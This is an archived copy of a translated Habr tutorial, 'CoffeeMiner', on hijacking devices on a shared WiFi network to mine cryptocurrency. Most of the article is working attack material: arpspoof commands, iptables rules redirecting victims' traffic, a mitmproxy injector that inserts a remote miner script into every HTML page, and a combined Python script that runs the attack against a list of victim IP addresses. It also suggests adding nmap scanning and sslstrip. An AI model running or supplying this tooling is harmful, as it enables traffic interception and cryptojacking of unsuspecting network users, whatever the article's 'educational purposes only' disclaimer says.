<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CoffeeMiner: hacking WiFi to embed a crypto miner in HTML pages</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Warning: this article and the project are for educational purposes only. 

 A few weeks ago, I read about this case of Starbucks , where hackers hacke...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>CoffeeMiner: hacking WiFi to embed a crypto miner in HTML pages</h1><div class="post__text post__text-html js-mediator-article">  <b><i>Warning: this article and the project are for educational purposes only.</i></b> <br><br><img src="https://habrastorage.org/webt/qv/qk/rg/qvqkrgrmadnrsx3z1h5xolzef7a.png" align="left">  A few weeks ago, I read about <a href="https://motherboard.vice.com/en_us/article/gyd5xq/starbucks-wi-fi-hijacked-peoples-laptops-to-mine-cryptocurrency-coinhive">this case of Starbucks</a> , where hackers hacked laptops on a WiFi network to mine cryptocurrency on them.  And I thought it might be interesting to launch an attack in a different way. <br><br>  The purpose of this article is to explain how to conduct an MITM (man in the middle) attack in order to inject certain JavaScript code into HTML pages in order to force all devices connected to WiFi to mine cryptocurrency for the attacker. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The task is to create a script that conducts an autonomous attack on the WiFi network.  This is what we called <b>CoffeeMiner</b> , since attacks of this type can be carried out in a cafe. <br><a name="habracut"></a><br><h1>  1. Scenario </h1><br>  We consider a situation in which there are several machines connected to the WiFi network, and the attacker with CoffeeMiner intercepts traffic between users and the router. <br><br><img src="https://habrastorage.org/webt/er/xv/1f/erxv1fboikykkaibnzjv4cdcami.png"><br><br><h3>  1.1 Scenario configuration </h3><br>  The real situation is a WiFi router with connected laptops and smartphones.  We checked the script in this situation from the real world - and it works.  But for this article we will examine in more detail how to install it in a virtual environment. <br><br>  To implement this virtual script, we will use <a href="https://www.virtualbox.org/">VirtualBox</a> . <br><br>  First you need to download some Linux disk image and install it on the VirtualBox machine.  In this example, we will use <a href="https://www.kali.org/">Kali Linux</a> images. <br><br>  After downloading the ISO image, we prepare three VBox machines with the installed Linux image. <br><br>  To configure the described scenario, you need to prepare machines that perform the following roles: <br><br><ul><li>  Victim <br><ul><li>  A machine that connects to the router and browses the web. </li></ul></li><li>  Intruder <br><ul><li>  The machine where CoffeeMiner is launched and the MITM attack is performed. </li></ul></li><li>  Router / Gateway <br><ul><li>  Works as a normal gateway. </li></ul></li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/940/d57/016/940d570160a2d18da1e7d68a42b1b2c3.png"><br><br>  When performing an attack, the situation will be as follows: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0a1/160/677/0a116067732404c8201886cb258270d3.png"><br><br>  For each machine we use the following configuration: <br><br><ul><li>  Victim <br><ul><li>  network adapter: <br><ul><li>  eth0: Host-only Adapter </li></ul></li><li> / etc / network / interfaces: <br><br> <code>auto lo <br> iface lo inet loopback <br> <br> auto eth0 <br> iface eth0 inet static <br> address 10.0.2.10 <br> netmask 255.255.255.0 <br> gateway 10.0.2.15</code> </li> </ul></li><li>  Intruder <br><ul><li>  network adapter: <br><ul><li>  eth0: Host-only Adapter </li></ul></li><li>  / etc / network / interfaces: <br><br> <code>auto lo <br> iface lo inet loopback <br> <br> auto eth0 <br> iface eth0 inet static <br> address 10.0.2.20 <br> netmask 255.255.255.0 <br> gateway 10.0.2.15</code> </li> </ul></li><li>  Router / Gateway <br><ul><li>  network adapter: <br><ul><li>  eth0: Bridged Adapter </li><li>  eth1: Host-only Adapter </li></ul></li><li>  / etc / network / interfaces: <br><br> <code>auto lo <br> iface lo inet loopback <br> <br> auto eth0 <br> iface eth0 inet dhcp <br> <br> auto eth1 <br> iface eth1 inet static <br> address 10.0.2.15 <br> netmask 255.255.255.0</code> </li> </ul></li></ul><br><h1>  2. CoffeeMiner, code parsing </h1><br><h3>  2.1.  ARP-spoofing </h3><br>  The first step is to understand how the MITM attack is performed. <br><br>  <a href="https://en.wikipedia.org/wiki/ARP_spoofing">From Wikipedia</a> : <br><br>  <i>‚ÄúIn computer networks, ARP-spoofing (ARP cache poisoning or ARP poison routing) is a technique when an attacker sends (counterfeit) messages to the local network via the Address Resolution Protocol (ARP).</i>  <i>In general, the goal is to bind the attacker's MAC address to another host‚Äôs IP address, such as the default gateway, so any traffic for that IP address will be directed to the attacker instead. ‚Äù</i> <br><br>  For the implementation of an ARP-spoofing attack, we will use the <b>dsniff</b> library. <br><br> <code>arpspoof -i interface -t ipVictim ipGateway <br> arpspoof -i interface -t ipGateway ipVictim</code> <br> <br><h3>  2.2.  mitmproxy </h3><br>  <a href="https://mitmproxy.org/">Mitmproxy</a> is a program for analyzing and editing traffic that passes through a host.  We will use it to embed javascript into html pages. <br><br>  For simplicity, we embed a single line of code into HTML pages.  This line of code starts the crypto miner: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://httpserverIP:8000/script.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><h3>  2.3.  Implementation </h3><br>  When we intercepted the victim‚Äôs traffic, we can inject our script into it.  For implementation we use mitmproxy API: <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> bs4 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> BeautifulSoup <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mitmproxy <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctx, http <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> argparse <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> Injector: def __init__(self, <span class="hljs-type"><span class="hljs-type">path</span></span>): self.path = <span class="hljs-type"><span class="hljs-type">path</span></span> def response(self, flow: http.HTTPFlow) -&gt; <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> self.path: html = BeautifulSoup(flow.response.content, "html.parser") print(self.path) print(flow.response.headers["content-type"]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> flow.response.headers["content-type"] == <span class="hljs-string"><span class="hljs-string">'text/html'</span></span>: script = html.new_tag( "script", src=self.path, <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>=<span class="hljs-string"><span class="hljs-string">'application/javascript'</span></span>) html.body.<span class="hljs-keyword"><span class="hljs-keyword">insert</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>, script) flow.response.content = str(html).encode("utf8") print("Script injected.") def <span class="hljs-keyword"><span class="hljs-keyword">start</span></span>(): parser = argparse.ArgumentParser() <span class="hljs-keyword"><span class="hljs-keyword">parser</span></span>.add_argument("path", <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>=str) args = <span class="hljs-keyword"><span class="hljs-keyword">parser</span></span>.parse_args() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Injector(args.path)</code> </pre> <br><h3>  2.4.  HTTP server </h3><br>  As we saw, the injector adds one line to the HTML pages, with a call to our crypto miner in JavaScript.  So you need to place the script file on the HTTP server. <br><br>  In order to issue a script of the crypto miner, we will launch the HTTP server on the attacker's machine.  For this we use the python library 'http.server': <br><br><pre> <code class="hljs pgsql">#!/usr/bin/env python <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> http.<span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socketserver <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os PORT = <span class="hljs-number"><span class="hljs-number">8000</span></span> web_dir = os.path.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(os.path.dirname(__file__), <span class="hljs-string"><span class="hljs-string">'miner_script'</span></span>) os.chdir(web_dir) <span class="hljs-keyword"><span class="hljs-keyword">Handler</span></span> = http.<span class="hljs-keyword"><span class="hljs-keyword">server</span></span>.SimpleHTTPRequestHandler httpd = socketserver.TCPServer(("", PORT), <span class="hljs-keyword"><span class="hljs-keyword">Handler</span></span>) print("serving at port", PORT) httpd.serve_forever()</code> </pre> <br>  The above code is a simple HTTP server that is sent to the victims by our crypto liner when they request it. <br><br>  The JavaScript miner will be placed in the / miner_script directory.  In our case, the CoinHive JavaScript miner is <a href="https://coinhive.com/">used</a> . <br><br><h3>  2.5.  Cryptomineer CoinHive </h3><br>  <a href="https://coinhive.com/">CoinHive</a> is a JavaScript miner for <a href="https://coinmarketcap.com/es/currencies/monero/">Monero cryptocurrency</a> (XMR).  You can add it to the site and use the CPU computing resources on users' computers to calculate hashes using the Cryptonight PoW algorithm, which is used to mine Monero using the <a href="https://cryptonote.org/">CryptoNote</a> protocol. <br><br>  The use of the CoinHive miner makes sense if the user stays on the webpage for a relatively long time.  So, for example, for a site with average sessions of 40 seconds, it does not make much sense. <br><br>  Since we are implementing a miner for absolutely all pages, the miner will work on the computers of victims for a long time. <br><br><img src="https://habrastorage.org/webt/he/fy/rp/hefyrpmrawqcywjk9ilxkluc4l0.jpeg"><br><br><h1>  3. CoffeeMiner, integrating everything together </h1><br>  The main task is to link all the described concepts into one autonomous installation.  This will be CoffeeMiner. <br><br>  The point is that one CoffeeMiner script performs an ARP-spoofing attack and installs a mitmproxy to embed a CoinHive crypto miner in the HTML pages of the victims. <br><br>  First you need to configure ip_forwarding and IPTABLES so that the attacker's machine works as a proxy: <br><br> <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward <br> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE <br> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</code> <br> <br>  To carry out an ARP-spoofing attack for all the victims, we prepare the file 'victims.txt' with the IP addresses of all the victims.  We read these addresses in several lines in Python (as well as the IP address of the gateway) - and conduct an ARP-spoofing attack for each victim's IP address. <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># get gateway_ip gateway = sys.argv[1] print("gateway: " + gateway) # get victims_ip victims = [line.rstrip('\n') for line in open("victims.txt")] print("victims:") print(victims) # run the arpspoof for each victim, each one in a new console for victim in victims: os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &amp;") os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &amp;")</span></span></code> </pre> <br>  After that, it remains to start the HTTP server: <br><br> <code>&gt; python3 httpServer.py</code> <br> <br>  And now you can run mitmproxy through injector.py: <br><br> <code>&gt; mitmdump -s 'injector.py http://httpserverIP:8000/script.js'</code> <br> <br><h3>  3.1.  CoffeeMiner, the final script </h3><br>  Now we have combined all the above concepts into a single coffeeMiner.py script: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-comment"><span class="hljs-comment">#get gateway_ip (router) gateway = sys.argv[1] print("gateway: " + gateway) # get victims_ip victims = [line.rstrip('\n') for line in open("victims.txt")] print("victims:") print(victims) # configure routing (IPTABLES) os.system("echo 1 &gt; /proc/sys/net/ipv4/ip_forward") os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE") os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080") # run the arpspoof for each victim, each one in a new console for victim in victims: os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &amp;") os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &amp;") # start the http server for serving the script.js, in a new console os.system("xterm -hold -e 'python3 httpServer.py' &amp;") # start the mitmproxy os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")</span></span></code> </pre> <br>  As well as the injector.py script: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> bs4 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> BeautifulSoup <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mitmproxy <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctx, http <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> argparse <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Injector</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, path)</span></span></span><span class="hljs-function">:</span></span> self.path = path <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">response</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, flow: http.HTTPFlow)</span></span></span><span class="hljs-function"> -&gt; </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">None</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> self.path: html = BeautifulSoup(flow.response.content, <span class="hljs-string"><span class="hljs-string">"html.parser"</span></span>) print(self.path) print(flow.response.headers[<span class="hljs-string"><span class="hljs-string">"content-type"</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> flow.response.headers[<span class="hljs-string"><span class="hljs-string">"content-type"</span></span>] == <span class="hljs-string"><span class="hljs-string">'text/html'</span></span>: print(flow.response.headers[<span class="hljs-string"><span class="hljs-string">"content-type"</span></span>]) script = html.new_tag( <span class="hljs-string"><span class="hljs-string">"script"</span></span>, src=self.path, type=<span class="hljs-string"><span class="hljs-string">'application/javascript'</span></span>) html.body.insert(<span class="hljs-number"><span class="hljs-number">0</span></span>, script) flow.response.content = str(html).encode(<span class="hljs-string"><span class="hljs-string">"utf8"</span></span>) print(<span class="hljs-string"><span class="hljs-string">"Script injected."</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> parser = argparse.ArgumentParser() parser.add_argument(<span class="hljs-string"><span class="hljs-string">"path"</span></span>, type=str) args = parser.parse_args() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Injector(args.path)</code> </pre> <br>  And to launch an attack, all you have to do is to run the following command: <br><br> <code>&gt; python3 coffeeMiner.py RouterIP</code> <br> <br><h1>  4. Demo </h1><br>  For the demonstration, we use a virtual script with VirtualBox, as described above. <br><br>  If we want to carry out an attack manually, then we need the following consoles: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6f0/bac/2a0/6f0bac2a0db5c3bb61f80071d812aaef.png"><br><br>  Then, when the ARP-spoofing attack is completed, and the injector and HTTP server are ready to launch, we can go to the victim's virtual machine and open some website.  The victim‚Äôs traffic will go through the attacker's computer and activate the injector: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fc4/bab/7c5/fc4bab7c5e0333cdd22bfaf583ed97df.png"><br><br>  As a result, on all the HTML pages that the victim views, there will be HTML lines of code that the attacker has injected. <br><br><img src="https://habrastorage.org/webt/_g/ty/-d/_gty-d04ozzzvuobarluenol6nq.gif"><br><br><h3>  4.1.  Demo video </h3><br>  On the following videos you can see all the steps of the operation using the coffeeMiner.py script: <br><br><ul><li>  VirtualBox demo: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/wmYJ6Z4LoCA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></li><li>  Real WiFi network with connected laptops: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/-TnzGLUD0DU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></li></ul><br><h1>  Conclusion </h1><br>  As we have seen, such an attack is easy to carry out.  And an autonomous attack on the WiFi network can be carried out. <br><br>  There is another thought that in a real WiFi network it is better to use a powerful WiFi antenna to better cover the entire physical space. <br><br>  The main goal of this work is to conduct an autonomous attack, but we still need to edit the victims.txt file with the IP addresses of the victims.  In the next version, you can add the Nmap offline scan feature to add detected IP addresses to the CoffeeMiner list of victims.  Another possible feature is the addition of sslstrip to ensure the introduction of an additional line of code even on the pages of sites that the user requests via HTTPS. <br><br>  The full code is available in <a href="https://github.com/arnaucode/coffeeMiner">the GitHub repository</a> . <br><br>  <b><i>Warning: this article and the project are for educational purposes only.</i></b> </div><p>Source: <a href="https://habr.com/ru/post/347144/">https://habr.com/ru/post/347144/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../347130/index.html">7 types of office loafers - part one</a></li>
<li><a href="../347132/index.html">We comprehend C deeper using assembler. Part 3</a></li>
<li><a href="../347134/index.html">16 Tons. How I saved a dying WordPress site with very superficial knowledge of this CMS</a></li>
<li><a href="../347138/index.html">Making games in Python 3 and Pygame: Part 1</a></li>
<li><a href="../347140/index.html">How to cook AR on android</a></li>
<li><a href="../347146/index.html">Query Profiler in Phoenix. And a little bit about how stacktrace works in Elixir / Erlang</a></li>
<li><a href="../347148/index.html">The digest of interesting materials for the mobile # 237 developer (January 15-21)</a></li>
<li><a href="../347152/index.html">Account Manager: accounts, tokens and all-all-all. Yandex lecture</a></li>
<li><a href="../347154/index.html">Service control panel. Part 2. On the way to the frontend</a></li>
<li><a href="../347158/index.html">Even faster acceleration of WebAssembly: new streaming and layered compiler in Firefox</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>